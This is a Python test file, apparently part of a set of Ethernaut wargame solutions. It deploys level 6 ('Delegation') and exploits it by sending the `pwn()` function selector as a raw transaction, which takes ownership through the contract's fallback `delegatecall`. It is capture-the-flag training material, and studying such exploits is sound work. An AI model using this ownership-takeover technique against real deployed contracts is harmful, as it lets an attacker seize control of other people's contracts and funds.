from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv06_delegation import Delegate, Delegation


@default_chain.connect()
def test_lv06():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv06()
    exploit_lv06(contract)
    ethernaut.check_lv06(contract)

def exploit_lv06(contract: Delegation):
    # Attack vector: insecure function in implementation contract
    # Training: delegatecall, fallback(), invoking function by function selector 
    function_selector = Abi.encode_with_signature("pwn()", [], [])
    contract.transact(function_selector)
